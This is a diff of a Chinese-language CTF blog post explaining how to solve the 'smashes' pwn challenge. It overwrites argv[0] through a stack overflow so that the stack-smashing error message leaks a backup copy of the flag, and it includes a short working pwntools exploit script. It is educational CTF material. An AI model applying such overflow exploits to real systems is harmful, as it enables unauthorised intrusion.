@@ -78,7 +78,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Canary && argv[0]," />
 
 
 
@@ -96,13 +96,25 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="ScUpax0s">
-<meta property="og:url" content="http://yoursite.com/categories/CTF/index.html">
+<meta name="description" content="日常刷题，马上Jarvis的就刷完啦！准备转战buuoj，加油。 0x01 题目概览 64位程序，开了canary，去掉了符号表 使用gets进行读取，可以进行栈溢出，溢出后触发stack smashing 这个地方很有意思。先看一下发现题目中有个flag。)但是有一个问题是这里)如果程序正常执行到这里，flag会被改掉，那么实际上这个位置的flag就不能用了，这里有一个知识点:当ELF文件比较小">
+<meta property="og:type" content="article">
+<meta property="og:title" content="主动SSP覆盖argv[0]">
+<meta property="og:url" content="http://yoursite.com/2020/05/22/%E4%B8%BB%E5%8A%A8SSP%E8%A6%86%E7%9B%96argv-0/index.html">
 <meta property="og:site_name" content="ScUpax0s">
+<meta property="og:description" content="日常刷题，马上Jarvis的就刷完啦！准备转战buuoj，加油。 0x01 题目概览 64位程序，开了canary，去掉了符号表 使用gets进行读取，可以进行栈溢出，溢出后触发stack smashing 这个地方很有意思。先看一下发现题目中有个flag。)但是有一个问题是这里)如果程序正常执行到这里，flag会被改掉，那么实际上这个位置的flag就不能用了，这里有一个知识点:当ELF文件比较小">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/22/YX7lPs.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/22/YX7yM6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/22/YX7HL8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/22/YXHwm8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/22/YXqxWd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/22/YXLVYQ.png">
+<meta property="article:published_time" content="2020-05-22T13:30:51.000Z">
+<meta property="article:modified_time" content="2020-05-22T14:02:02.367Z">
 <meta property="article:author" content="Paxos">
+<meta property="article:tag" content="Canary &amp;&amp; argv[0]">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/05/22/YX7lPs.png">
 
 
 
@@ -131,13 +143,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/categories/CTF/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/05/22/主动SSP覆盖argv-0/"/>
 
 
 
 
 
-  <title>Category: CTF | ScUpax0s</title>
+  <title>主动SSP覆盖argv[0] | ScUpax0s</title>
   
 
 
@@ -162,7 +174,7 @@
     
   
 
-  <div class="container sidebar-position-left  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -266,167 +278,194 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block category">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>CTF<small>Category</small>
-        </h1>
-      </div>
-
-      
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/22/%E4%B8%BB%E5%8A%A8SSP%E8%A6%86%E7%9B%96argv-0/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Paxos">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/48941180?s=460&u=c99ae53e7dd15c30c6283cc36edb2f8825ce8aec&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ScUpax0s">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2020/05/22/%E4%B8%BB%E5%8A%A8SSP%E8%A6%86%E7%9B%96argv-0/" itemprop="url">
-              
-                <span itemprop="name">主动SSP覆盖argv[0]</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">主动SSP覆盖argv[0]</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2020-05-22T21:30:51+08:00"
-              content="2020-05-22" >
-          05-22
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-22T21:30:51+08:00">
+                2020-05-22
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/05/21/%E4%BB%8E%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84pwn%EF%BC%88%E4%BA%91%E7%9B%BE%EF%BC%89%E5%AD%A6%E4%B9%A0UAF%E4%B8%8Efastbin-attack/" itemprop="url">
-              
-                <span itemprop="name">从网鼎杯白虎组pwn（云盾）学习UAF与fastbin attack</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2020-05-21T23:07:43+08:00"
-              content="2020-05-21" >
-          05-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/" itemprop="url">
-              
-                <span itemprop="name">canary绕过与ROP.md</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2020-05-13T00:32:14+08:00"
-              content="2020-05-13" >
-          05-13
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/05/09/%E4%BB%8E%E4%B8%80%E9%81%93%E8%8F%9C%E5%8D%95%E9%A2%98%E9%94%BB%E7%82%BCpwn%E4%B8%AD%E7%9A%84%E5%A0%86%E6%8A%80%E8%83%BD/" itemprop="url">
-              
-                <span itemprop="name">从一道菜单题锻炼pwn中的堆技能</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2020-05-09T13:00:12+08:00"
-              content="2020-05-09" >
-          05-09
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/04/30/%E4%BB%8E%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84x64pwn%E5%AD%A6%E4%B9%A0mprotect%E4%B8%8EGOT%E8%A1%A8%E8%A6%86%E5%86%99/" itemprop="url">
-              
-                <span itemprop="name">从一道经典的x64pwn学习mprotect与GOT表覆写</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2020-04-30T16:38:37+08:00"
-              content="2020-04-30" >
-          04-30
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+        <p><del>日常刷题，马上Jarvis的就刷完啦！准备转战buuoj，加油。</del></p>
+<h2 id="0x01-题目概览"><a href="#0x01-题目概览" class="headerlink" title="0x01 题目概览"></a>0x01 题目概览</h2><ul>
+<li>64位程序，开了canary，去掉了符号表<img src="https://s1.ax1x.com/2020/05/22/YX7lPs.png" alt=""></li>
+<li>使用gets进行读取，可以进行栈溢出，溢出后触发stack smashing</li>
+<li>这个地方很有意思。先看一下发现题目中有个flag。<img src="https://s1.ax1x.com/2020/05/22/YX7yM6.png" alt="">)但是有一个问题是这里<img src="https://s1.ax1x.com/2020/05/22/YX7HL8.png" alt="">)如果程序正常执行到这里，flag会被改掉，那么实际上这个位置的flag就不能用了，这里有一个知识点:<strong>当ELF文件比较小的时候，他的不同区段可能会被多次映射，也就是说flag可能有备份，gdb查找一下</strong>，查找一下，果然在0x400d21有备份。<img src="https://s1.ax1x.com/2020/05/22/YXHwm8.png" alt="">,我们选择用这个备份来打。</li>
+</ul>
+<h2 id="0x02-攻击思路"><a href="#0x02-攻击思路" class="headerlink" title="0x02 攻击思路"></a>0x02 攻击思路</h2><ul>
+<li>其实思路很朴素，已知当我们主动出发SSP时，程序会输出argv[0],那么我们只要把argv[0]改成flag的地址就行了。</li>
+<li>接下来调一下填充的长度<img src="https://s1.ax1x.com/2020/05/22/YXqxWd.png" alt="">)这是我们要改掉的地址，距离<img src="https://s1.ax1x.com/2020/05/22/YXLVYQ.png" alt=""></li>
+<li>我们只要把这个地址换成flag的备份地址就ok</li>
+</ul>
+<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">io = process(<span class="string">"./smashes"</span>)</span><br><span class="line">payload = flat(<span class="string">'a'</span>*<span class="number">0x218</span>,p64(<span class="number">0x400d21</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">"a"</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Canary-argv-0/" rel="tag"># Canary && argv[0]</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/21/%E4%BB%8E%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84pwn%EF%BC%88%E4%BA%91%E7%9B%BE%EF%BC%89%E5%AD%A6%E4%B9%A0UAF%E4%B8%8Efastbin-attack/" rel="next" title="从网鼎杯白虎组pwn（云盾）学习UAF与fastbin attack">
+                <i class="fa fa-chevron-left"></i> 从网鼎杯白虎组pwn（云盾）学习UAF与fastbin attack
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -434,6 +473,10 @@
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -454,8 +497,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="https://avatars2.githubusercontent.com/u/48941180?s=460&u=c99ae53e7dd15c30c6283cc36edb2f8825ce8aec&v=4"
@@ -562,6 +614,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-题目概览"><span class="nav-number">1.</span> <span class="nav-text">0x01 题目概览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-攻击思路"><span class="nav-number">2.</span> <span class="nav-text">0x02 攻击思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-exp"><span class="nav-number">3.</span> <span class="nav-text">0x03 exp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -702,10 +770,10 @@
 
 
   
-    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
 
-  
+
 
   
 
@@ -752,6 +820,23 @@
   
 
   
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
 
   
 
